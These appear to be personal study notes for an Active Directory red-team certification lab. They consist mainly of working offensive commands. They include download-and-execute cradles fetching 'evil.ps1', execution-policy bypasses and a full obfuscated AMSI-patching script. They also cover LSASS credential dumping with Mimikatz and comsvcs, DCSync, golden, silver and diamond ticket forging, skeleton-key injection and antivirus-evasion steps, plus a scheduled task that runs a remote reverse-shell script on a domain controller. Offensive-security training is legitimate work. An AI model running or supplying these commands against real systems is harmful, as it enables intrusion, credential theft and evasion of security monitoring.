# **Load and import PS scripts and modules**
`. C:\AD\Tools\script.ps1` (dot sourcing)
`Import-Module C:\AD\Tools\ADModule-master\AD.psd1` (import a module or a script)
## **Download remotely**
`iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/payload.ps1'` or 
```PowerShell
$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://IP:PORT/evil.ps1');sleep 5; $response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
### **PSv3 onwards**
`iex (iwr 'http://IP:PORT/evil.ps1')` or
```PowerShell
$h=New-Object -ComObject 
Msxml2.XMLHTTP;$h.open('GET', 'http://IP:PORT/evil.ps1',$false);$h.send();iex
$h.responseText
```
or
```PowerShell
$wr= [System.NET.WebRequest]::Create("http://IP:PORT/evil.ps1")
$r= $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
# **Bypass Execution Policy:**
`powershell -ep bypass` 
`powershell -ExecutionPolicy bypass`
`powershell -ExecutionPolicy bypass -File *.ps1` 
`powershell -c <cmd>`
`powershell -encodedcommand`
`$env:PSExecutionPolicyPreference="bypass"`
`Set-ExecutionPolicy Bypass -Scope Process`

# **Bypass Security Controls:**
Such as: Script Block Logging / AMSI (AntiMalware Scan Interface) / CLM (Constrained Language Mode) integrated with AppLocker and WDAC (Device Guard)
obfuscated version of https://github.com/OmerYa/Invisi-Shell (it gets detected)
***How to use***
- With admin privileges (RunWithPathAsAdmin.bat)
- With non-admin privileges (RunWithRegistryNonAdmin.bat)
type exit from the new PS sessions to complete the clean-up

***Obfuscation***
full obfuscation of PS scripts, https://github.com/danielbohannon/Invoke-Obfuscation

***load scripts in memory and avoid detection using AMSI bypass***
AMSITrigger: https://github.com/RythmStick/AMSITrigger 
`AmsiTrigger_x64.exe -i <PATH>\evil.ps1` (identify the part of the script that is detected)
DefenderCheck: https://github.com/matterpreter/DefenderCheck
`DefenderCheck.exe evil.ps1` (identify code/strings from binary/file that Defender detects)
# **Enumeration Tools:**
#### **ActiveDirectory PowerShell Module**
MS signed and works in PS CLM
```PowerShell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```
https://github.com/samratashok/ADModule
#### **Powerview**
`. C:\AD\Tools\PowerView.ps1`
https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/powerview.ps1
#### **SharpView**
https://github.com/tevora-threat/SharpView

# **Domain Enumeration**
- #### ***Get current domain***
`Get-Domain` (PowerView)
`Get-ADDomain` (AD Module)
- #### ***Get object of another domain***
`Get-Domain -Domain moneycorp.local` (PowerView)
`Get-ADDomain -Identity moneycorp.local` (AD Module)
- #### ***Get domain SID for the current domain***
`Get-DomainSID` (PowerView)
`(Get-ADDomain).DomainSID` (AD Module)
- #### ***Get domain policy for the current domain***
`Get-DomainPolicyData` (PowerView)
`(Get-DomainPolicy).systemaccess` and `(Get-DomainPolicy).KerberosPolicy` 
- #### ***Get domain policy for another domain***
`(Get-DomainPolicyData -domain moneycorp.local).systemaccess` (PowerView)
- #### ***Get domain controllers for the current domain***
`Get-DomainController` (PowerView)
`Get-ADDomainController` (AD Module)
- #### ***Get domain controllers for another domain***
`Get-DomainController -Domain moneycorp.local` (PowerView)
`Get-ADDomainController -DomainName moneycorp.local` (AD Module)
# **User Enumeration**
- #### ***Get a list of users in the current domain***
`Get-DomainUser` or `Get-DomainUser -Identity student1` (PowerView)
```PowerShell
[AD Module]
`Get-ADUser -Filter * -Properties *
`Get-ADUser -Identity student1 -Properties *
```
- #### ***Get a list of all properties for users in the current domain***
```PowerShell
[PowerView]
Get-DomainUser -Properties samaccountname,logonCount
Get-Domainuser -Identity student1 -Properties *
```
```PowerShell
[AD Module]
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```
- #### ***Search for a particular string in a user's atrributes***
`Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description` (PowerView)
`Get-ADUser -Filter 'Description -like *built*' -Properties Description | select name,Description`  (AD Module)
# **Computers Enumeration**
- #### ***Get a list of computers in the current domain***
```PowerShell
[PowerView]
Get-DomainComputer | select Name
Get-DomainComputer -OperatingSystem "*Server 2022*"
Get-DomainComputer -Ping
```
```PowerShell
[AD Module]
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputeName $_.DNSHostName}
```
# **Groups Enumeration**
- #### ***Get all the groups in the current domain***
`Get-DomainGroup | select Name` or `Get-DomainGroup -Domain <domain>` (PowerView)
`Get-ADGroup -Filter * | select name` or `Get-ADGroup -Filter * -Properties *`  (AD Module)
- #### ***Get all the groups containing the word "admin" in the group name***
`Get-DomainGroup *admin*` (PowerView)
`Get-ADGroup -Filter 'Name -like "*admin*"' | select Name` (AD Module)
- #### ***Get all the members of the Domain Admins group***
`Get-DomainGroupMember -Identity "Domain Admins" -Recurse` (PowerView)
`Get-ADGroupMember -Identity "Domain Admins" -Recurse` (AD Module)
- #### ***Get all the membership of a user***
`Get-DomainGroup -UserName "studen1"` (PowerView)
`Get-ADPrincipalGroupMembership -Identity student1` (AD Module)
# **Local Enumeration**
- #### ***List all the groups on a machine (needs admin privs on non-dc machines)***
`Get-NetLocalGroup -ComputerName dcorp-dc` (PowerView)
- #### ***Get members of the local group  "Administrators" on machine (needs admin privs on non-dc machines)***
`Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators` (PowerView)
# **Logged Users Enumeration**
- #### ***Get actively logged users on a computer (needs local admin privs on the target)***
`Get-NetLoggedon -ComputerName dcorp-adminsrv` (PowerView)
- #### ***Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)***
`Get-LoggedonLocal -ComputerName dcorp-adminsrv` (PowerView)
- #### ***Get the last logged user on a computer (needs admins rights and remote registry on the target)***
`Get-LastLoggedOn -ComputerName dcorp-adminsrv` (PowerView)
# **Share Enumeration**
- #### ***Find shares on hosts in current domain***
`Invoke-ShareFinder -verbose` (PowerView)
- #### ***Find sensitive files on computers in the domain***
`Invoke-FileFinder -verbose` (PowerView)
- #### ***Get all fileservers of the domain***
`Get-NetFileServer` (PowerView)
# **Learning Objective 1**
[[Learning Objective 1]]
# **GPO Enumeration**
- #### ***Get list of GPO in current domain***
`Get-DomainGPO` or `Get-DomainGPO -Identity dcorp-student1` (PowerView)
- #### ***Get GPO which use Restricted Groups or groups.xml for interesting users***
`Get-DomainGPOLocalGroup` (PowerView)
- #### ***Get users which are in a local group of a machine using GPO***
`Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1` (PowerView)
- #### ***Get machines where the given user is a member of a specific group***
`Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose` (PowerView)
- #### ***Get OUs in a domain***
`Get-DomainOU` (PowerView)
`Get-ADOrganizationalUnit -Filter * -Properties *` (AD Module)
- #### ***Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU***
`Get-DomainGPO -Identity "{<GPO string>}"` (PowerView)
# **Learning Objective 2**
[[Learning Objective 2]]
# **ACL Enumeration**
ACL (Access Control List) is a list of ACE (Access Control Entries) - ACE coresponds to individual permission or audits access. Who has permission and what can be done on an object?
DACL -> Discretionary ACL
SACL -> System ACL
2 Types:
1. DACL: Define the permissions trustees (user ou group) have on an object
2. SACL: Logs success and failure audit messages when an object is accessed
- #### ***Get the ACLs associated with a specified object***
`Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs` (PowerView)
- #### ***Get the ACLs associated with the specified prefix to be used to search***
`Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose` (PowerView)
- #### ***Enumerate ACLs using AD module but without resolving GUIDs***
`(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access` (AD module)
- #### ***Search for interesting ACEs***
`Find-InterestingDomainAcl -ResolveGUIDs` (PowerView)
- #### ***Get the ACLs associated with the specified path***
`Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"` (PowerView)
# **Learning Objective 3**
[[Learning Objective 3]]
## **Trust**
Trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest It can be automatic (parent-child, same forest, etc) or established (forest, external)
#### **Trust Direction:**
- One-way trust - Unidirectional, users in the trusted domain can access resources in the trusting domain but the reverse is not true
- Two-way trust - Bidirectional, users of both domains can access resources in the other domain
#### **Transitivity:**
- Transitive - Can be extended to establish trust relationships with other domains
-all the default intra-forest trust relationships (Tree-root, Parent-Child) between domains within a same forest are transitive two-way trusts.
- Nontransitive - Cannot be extended to other domains in the forest. Can be two-way or one-way.
-this is the default trust (called external trust) between two domains in different forests when forests do not have trust relationship
#### **Types:**
- Default/Automatic Trusts
	1. Parent-child trust
		- It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a tree. For example, dollarcorp.moneycorp.local is a child of moneycorp.local
		- This trust is always two-transitive
	2. Tree-root trust
		- It is created automatically between whenever a new domain tree is added to a forest root.
		- This trust is always two-way transitive
- External trusts
	- Between two domains in different forests when forests do not have a trust relationship. Can be one-way or two-day and is nontransitive
- Forests Trusts
	- Between forest root domain
	- Cannot be extended to a third forest (no implicit trust)
	- Can be one-way or two-way transitive
# **Domain Trust Mapping:**
- #### ***Get a list of all domain trusts for the current domain***
`Get-DomainTrust` (PowerView)
`Get-ADTrust` (AD Module)
- #### ***Get a list of all domain trusts for a certain domain***
`Get-DomainTrust -Domain us.dollacorp.moneycorp.local` (PowerView)
`Get-ADTrust -Identity us.dollarcorp.moneycorp.local` (AD Module)
`Map Domain Trusts` option in BloodHound CE 
# **Domain Forest Mapping:**
- #### ***Get details about the current forest***
`Get-Forest` (PowerView)
`Get-ADForest` (AD Module)
- #### ***Get details about the specified forest***
`Get-Forest -Forest eurocorp.local` (PowerView)
`Get-ADForest -Identity eurocorp.local` (AD Module)
- #### ***Get all domains in the current forest***
`Get-ForestDomain` (PowerView)
- #### ***Get all domains in a specified forest***
`Get-ForestDomain -Forest eurocorp.local` (PowerView)
`(Get-ADForest).Domains` (AD Module)
- #### ***Get all global catalogs for the current forest***
`Get-ForestGlobalCatalog` (PowerView)
- #### ***Get all global catalogs for the specified forest***
`Get-ForestGlobalCatalog -Forest eurocorp.local` (PowerView)
`Get-ADForest | select -ExpandProperty GlobalCatalog` (AD Module)
- #### ***Map trusts of the current forest (no Forest trusts in the lab)***
`Get-ForestTrust` (PowerView)
- #### ***Map trusts of a forest (no Forest trusts in the lab***
`Get-ForestTrust -Forest eurocorp.local` (PowerView)
`Get-ADForest -Filter 'msDS-TrustForestTrustInfo -ne "$null"'` (AD Module)
# **Learning Objective 4**
[[Learning Objective 4]]
# **User Hunting:** ***NOISY***
- #### ***Find all machines in the current domain where the current user has local admin acess***
`Find-LocalAdminAccess -Verbose` (PowerView)
This function queries the DC of the current or provided domain for a list of computers (`Get-NetComputer`) and then use multi-thread `Invoke-CheckLocalAdminAccess` on each machine
This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAcess are blocked.See `Find-WMILocalAdminAccess.ps1` and `Find-PSRemotingLocalAdminAccess.ps1`
- #### ***Find computers where a domain admin (or specified user) has sessions***
`Find-DomainUserLocation -Verbose` and `Find-DomainUserLocation -UserGroupIdentity "RDPUsers"` (PowerView)
This function queries the DC of the current or provided domain for member of the given group (Domain Admins by default) using `Get-DomainGroupMember`, gets a list of computers (`Get-DomainComputer`) and list sessions and logged on users (`Get-NetSessions`/`Get-NetLoggedOn`) from each machine. Note that for Server 2019 and onwards, local administrator privileges are required to list sessions.
- #### ***Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess)***
`Find-DomainUserLocation -CheckAccess` (PowerView)
- #### ***Find computers (File Servers and Distributed File Servers) where a domain admin session is available***
`Find-DomainUserLocation -Stealth` (PowerView)
- #### ***List sessions on remote machines (https://github.com/Leo4j/Invoke-SessionHunter)***
`Invoke-SessionHunter -FailSafe` (doesnt need admin access on remote machines. Uses Remote Registry and queries HKEY_USERS hive)
`Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt` (OpSec friendly command)
# **Privilege Escalation:**
In AD there are 2 scenarios which lead to Privilege Escalation:
1. Hunting for Local Admin acess on other machines 
2. Hunting for high privilege domain accounts (like Domain Administrator)
Ways of locally escalating privileges on Windows:
- Missing patches
- Automated deployment and AutoLogon password in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured services
- DLL Hijacking and more
- NTLM Relaying aka Won't fix
### **Tools:**
[[Windows PrivEsc]]
**PowerUp:** [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- #### ***Get services with unquoted paths and a space in their name***
`Get-ServiceUnquoted -Verbose`
- #### ***Get services where the current user can write to its binary path or change arguments to the binary***
`Get-ModifiableServiceFile -Verbose`
- #### ***Get the services whose configuration current user can modify***
`Get-ModifiableService -Verbose`
**Privesc:** [Privesc](https://github.com/enjoiz/Privesc)
***BEST*** - **winPEAS:** [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

- #### ***Run all checks***
`Invoke-AllChecks` (PowerUp)
`Invoke-PrivEsc` (Privesc)
`winPEASx64.exe` (winPEAS) - ***BEST***
# **Feature Abuse**
Target enterprise applications are not the focus of security teams and are not built keeping security in mind, many either need Administritive privileges or SYSTEM privileges
### **Jenkins**
older version as an example of vulnerable enterprise application.
Is widely used as a Continous Integration (CI) tool
Running system commands on a Jenkins server running on dcorp-ci (172.16.3.11:8080)
**NOT FOCUS TOO MUCH - JUST AN EXAMPLE**
2 ways of executing commands on a Jenkins Master:
1. If we have admin access -> http://IP:8080/script, in the script console, Groovy scripts could be executed:
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[<INSERT_COMMAND>]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
2. If we dont have admin access, but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
`powershell -c <command>`, or download and execute a script, run encoded scripts, etc ...

# **Learning Objective 5**
[[Learning Objective 5]]
# **Foothold established**
now with a shell and local admin privileges, we will use BloodHound to map attack paths (useful for pentesters and blue teamers, not so much for red teamers because of noise)
2 free versions of BloodHound:
- BloodHound Legacy - https://github.com/BloodHoundAD/BloodHound
- BloodHound CE (Community Edition) - https://github.com/SpecterOps/BloodHound
BloodHound CE > BloodHound Legacy
BloodHound Legacy is present in the Tools directory of student VM
Read-only access to prep-populated BloodHound CE - https://crtpbloodhound-altsecdashboard.msappproxy.net/. Use the credentials for crtpreader@altsecdashboard.onmicrosoft.com from the lab portal - https://adlab.enterprisesecurity.io
Dont need BloodHound CE or legacy, all that its needed is ingestors/collectors
- #### ***Supply data do BloodHound (remember to bypass .NET AMSI)***
```$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```
`. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1`
`Invoke-BloodHound -CollectionMethod All` or 
`SharpHound.exe`
Now the gathered data can be uploaded to the BloodHound application (both Legacy and CE)
- #### ***To make BloodHound collection stealthy, use -Stealth option. This removes noisy collection methods like RDP, DCOM, PSRemote and LocalAdmin***
`Invoke-BloodHound -Stealth`or `SharpHound.exe --stealth`
- #### ***To avoid detections like MDI***
`Invoke-BloodHound -ExcludeDCs`
# **Learning Objective 6**
[[Learning Objective 6]]
# **Lateral Movement - PowerShell Remoting**
- PowerShell Remoting (PSRemoting) is like psexec on steroids but much more silent and faster
- PSRemoting uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management
- Enabled by default on Server 2012 onwards with a FW exception
- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS)
- Its the recommended way to manage Windows Core Servers (without GUI)
- It may be needed to enable remoting (Enable-PSRemoting) on a Desktop Windows machines, Admin privs are required to do that
- The remoting process runs as a high integrity process. That is, you get an elevated shell
(start invisi-shell)
`Enter-PSSession -ComputerName dcorp-adminsrv` (get session as dcorp-adminsrv, we seen that we have administrative access)
- One-to-One - PSSession (Interactive, Runs in a new process (wsmprovhost), stateful)
`New-PSSession` and `Enter-PSSession`
- One-to-Many / Fan-out remoting (Non-interactive, executes commands parallelly)
`Invoke-Command`
	- Run commands and scripts on multiple remote computers, in disconnected sessions, as background job, etc
	- Best thing in PS for passing the hashes, using credentials and executing commands on multiple remote computers.
	- Use `-Credential` to pass username/password
	- `Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <servers>)` (execute commands or scriptblocks)
	- `Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <servers>)` (execute scripts from files)
	- ```$sess = New-PSSession -ComputerName server1
	Invoke-Command -Session $sess -ScriptBlock {$Proc = Get-Process}
	Invoke-Command -Session $sess -ScriptBlock {$Proc.Name}```
	or
	- ```$adminsrv = New-PSSession -ComputerName dcorp-adminsrv
	Enter-PSSession -Session $adminsrv```
PowerShell Remoting (unfortunely) supports the system-wide transcripts and deep script block logging
We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts): 
`winrs -remote:dcorp-adminsrv cmd` (MDE doesn't detect, MDI detects)
# **Lateral Movement - Credential Dumping/Extraction**
## **From LSASS**
(Do not touch LSASS, unless its the only option. Look for Credential Vault/DPAPI/SAMHIVE/LSA registry)
Mimikatz, Invoke-Mimikatz, Invoke-Mimi
- #### ***Dump credentials on a local machine using Mimikatz***
`Invoke-Mimikatz -Command "sekurlsa::ekeys"`
- #### ***Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)***
`SafetyKatz.exe "sekurlsa::ekeys"`
- #### ***Dumping credentials using SharpKatz (C# port of some of Mimikatz functionality)***
`SharpKatz.exe --Command ekeys`
- #### ***Dump credentials using Dumpert (Direct System Calls and API unhooking)***
`rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,dump`
- #### ***Using Pypykatz (Mimikatz functionality in Python)***
`pypykatz.exe live lsa`
- #### ***Using comsvcs.dll***
`tasklist /FI "IMAGENAME eq lsass.exe"`
`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass PID> C:\Users\Public\lsass.dmp full`
- #### ***From a linux attacking machine***
	- Impacket
	- Physmem2profit
# **Lateral Movement - OverPass-The-Hash**
Most opsec safe to use AES keys, dont use RC4 (NTLM hash), unless theres is no way to acquire AES keys. (MDI would flag as encryption downgrade, because its not normal to use RC4 keys in a ticket)
PTH - using NTLM hash on local accounts
OPTH - using NTLM/AES to create/request keberos ticket from DC
- #### ***OverPass-The-Hash (OPTH) generate tokens from hashes or keys. Needs "Run as administrator"***
`Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"` (Mimikatz)
`SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256key> /run:cmd.exe" "exit"` (SafetyKatz)
- #### ***Doesn't need "Run as administrator"***
`Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt`
- #### ***Needs "Run as administrator"***
`Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly: C:\Windows\System32\cmd.exe /show /ptt` (Rubeus)
# **Lateral Movement - DCSync**
Extract credentials from the DC without code execution on it, we can use DCSync
- #### ***DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain***
`Invoke-Mimikatz -Command "lsadump::dcsync /user:us\krbtgt"`
`SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`
(DA privileges are required to run DCSync)
# **Offensive .NET**
When using .NET (or any compiled language) there are some challenges:
- Detection by countermeasures (AV, EDR, etc)
- Delivery of payload (recall powershell download-execute craddles)
- Detection by logging like process creation logging, cli logging, etc...
Focus on bypass of signature based detection by Defender, we can use techniques like Obfuscation, Strin Manipulation, etc...
## **AV Bypass - String Manipulation**
We can use DefenderCheck: https://github.com/matterpreter/DefenderCheck (identify code/strings from binary/file that Defender detects). 
- #### ***Check SharpKatz.exe for signatures using DefenderCheck***
`DefenderCheck.exe <Path to SharpKatz binary>`
(after checking that something is flagged by Defender, we try to modify)
1. Open project in Visual Studio
2. Press "ctrl + H"
3. Find and replace the string "Credentials" with "Credents", you can use any other string as replacement, as long as that string it not present in the code)
4. Select the scope as "Entire Solution"
5. Press "Replace All" button
6. Build and recheck the binary with DefenderCheck
7. Repeat above steps if it still gets detected
## **AV Bypass - Obfuscation**
1. We can use ConfuserEx: https://github.com/mkaring/ConfuserEx to obfuscate the binary 
(after checking that something is flagged by Defender, we try to modify)
	1. Launch ConfuserEx
	2. In Project tab select the Base Directory where the binary file is located
	3. In Project tab Select the Binary File that we want to obfuscate
	4. In Settings tab add the rules
	5. In Settings tab edit the rule and select the preset as 'Normal'
	6. In Protect tab click on the protect button
The new obfuscated binary will be in the Confused folder under the Base Directory
## **AV Bypass - Payload Delivery**
We can use obfuscated version of NetLoader: https://github.com/Flangvik/NetLoader (it gets detected) to deliver our binary payloads
AMSI - AntiMalware Scan Interface
ETW - Event Tracking for Windows (eyes and ears of MDE, (MS EDR), it tells about behaviour, access and activity of an executable/binary)
- #### ***It can be used to load binary from filepath or URL and patch AMSI & ETW while executing***
`C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
- #### ***We also have AssemblyLoad.exe that can be used to load the NetLoader in-memory from a URL which then loads a binary from a filepath or URL***
`C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
# **Learning Objective 7**
[[Learning Objective 7]]
# **AD Domain Dominance**
DA is just the beginning of enterprise compromise, there are other things to do such as persist, escalate do enterprise admin, execute cross-trust attacks. 
# **Kerberos**
[[Basics]]
Basis of authentication in a Windows AD environment.
Clients (programs on behalf of a user) need to obtain tickets from KDC which is a service running on the DC. These tickets represent the client's credentials.
1. User's AES key signs and encrypts the timestamp that is sent to the DC (AS-REQ/PRE-AUTH)
2. KDC decrypts the timestamp and validates it (because DC has access to all the secrets in the domain), then DC sends a TGT encrypted and signed using AES keys of krbtgt (specific account on the DC created for this porpuse) to the client/user. (AS-REP)
3. The user sends the TGT encrypted with the krbtgt's AES keys requesting a TGS, for the DC to provice access to a certain service determined by the SPN. The DC only provices access if it can decrypt the TGT (TGS-REQ)
4. DC sends a TGS encrypted with the service's AES key (TGS-REP)
5. User sends the TGS to the service it wants to access to see if its authorized to connect and access that service
# **Persistence - Golden Ticket**
TGT is signed and encrypted with the hash of krbtgt account which makes a valid TGT (end of step 2 and the step3). If we can extract krbtgt account secrets we can forge our own TGT's.
The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine. (Its recommended to change the password of the krbtgt account twice as password history is maintained for the account)
***We are targeting the DC and we have DA privileges***
- #### ***Execute Mimikatz (or a variant) on DC as DA to get krbtgt hash***
`Invoke-Mimikatz -Command '"lsadump /patch"' -ComputerName dcorp-dc` (***noisy***)
- #### ***Use the DCSync feature for getting AES keys for the krbtgt account. Use with DA privs (or a user that has replication rights on the domain object)***
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"`
The DCSync option doesnt need code execution on the target DC
***its not recommended to use golden ticket attack or even domain admin privs if we are trying to not get detected***
(creating a golden ticket on any machine that has network connectivity with DC)
`C:\AD\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /aes256:<krbtgtAESkey> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`
Always make sure that the user is an active domain admin, id is the same security identifier as the user we specified. Optional:
`/startoffset:0` = ticket is available immediatelly, negative for a ticket available from past and larger number for future; `/endin:600` = ticket lifetime (default is 10 years) in minutes, the default AD setting is 10 hours = 600 minutes; `/renewmax:10080` = ticket lifetime with renewal (default is 10 years) in minutes, the default AD setting is 7 days = 10080
***always make sure that the tickets we forge are compliant to the target environment settings; Always use AES and not RC4 (NTLM); Only use DCSync on the DCs; Not target DA account using Golden Ticket***
# **Learning Objective 8**
[[Learning Objective 8]]
# **Persistence - Silver Ticket**
TGS is encrypted with the target service AES keys (step 5). If we can extract the service account secrets we can forge our own TGS's
Better than Golden Ticket because it doesnt interact with the DC
All use the machine account as the service account, so what we need is the machine account secrets of the target machine
30 days maximium for persistence (by default machine account passwords are reset every 30 days)
- #### ***Using hash of the DC computer account, below command provides access to file system on the DC***
`C:\AD\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /target:dcorp-dc.dollarcorp.moneycorp.local /service:<SPN4TGS> /aes256:<serviceaccounthash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`
(similar command can be used for any other service on a machine, like CIFS, HOST, RPCSS, HTTP). Always make sure that the user is an active domain admin, id is the same security identifier as the user we specified. HOST + RPCSS for WMI or HTTP for WinRM
- #### ***Command Execution using Silver Tickets***
`C:\AD\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /aes256:<serviceaccounthash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`
	***Schedule and execute a task - noisy but fine for PoC***
`schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority/SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.X:8080/Invoke-PowerShellTcp.ps1''')'"`
`schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"`
# **Learning Objective 9**
[[Learning Objective 9]]
# **Persistence - Diamond Ticket**
To bypass the problem of Golden Ticket maybe getting detected because there was no TGT request.
A Diamond Ticket is created by decrypting a valid TGT making changes to it and re-encypt it using the AES keys of the krbtgt account.
Golden Ticket was a TGT forging attack whereas Diamond Ticket is a TGT modifying attack
The Persistence lifetime depends on krbtgt account.
A Diamond Ticket is more opsec safe as it has: valid ticket times because a TGT issued by the DC is modified, In Golden Ticket there is no corresponding TGT request for TGS as the TGT is forged 
- #### ***We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too)***
`C:\AD\Tools\Rubeus.exe diamond /krbkey:<AES> /user:studentx /password:studentxpassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly: C:\Windows\System32\cmd.exe /show /ptt`
- #### ***We could also use /tgtdeleg option in place of credentials in case we have access as a domain user***
`C:\AD\Tools\Rubeus.exe diamond /krbkey:<AES> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly: C:\Windows\System32\cmd.exe /show /ptt`
# **Learning Objective 10**
[[Learning Objective 10]]
# **Persistence - Skeleton Key**
Patch a DC (lsass process) so that it allows access as any user with a single password. 
- #### ***Use the below command to inject a skeleton key (password would be mimikatz) on a DC of choice. DA privs required***
`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
- #### ***Now, its possible to access any machine with a valid username and password as mimikatz***
`Enter-PSSession -ComputerName dcorp-dc -credential dcorp\Administrator`
***not opsec safe, do not use on real engagements, only for testing detection***
(known to cause issues with ADCS)
- #### ***In case lsass is running as a protected access, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC***
It would be very noisy in logs - Service installation (Kernel mode driver)
```cmd
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```
# **Persistence - DSRM**
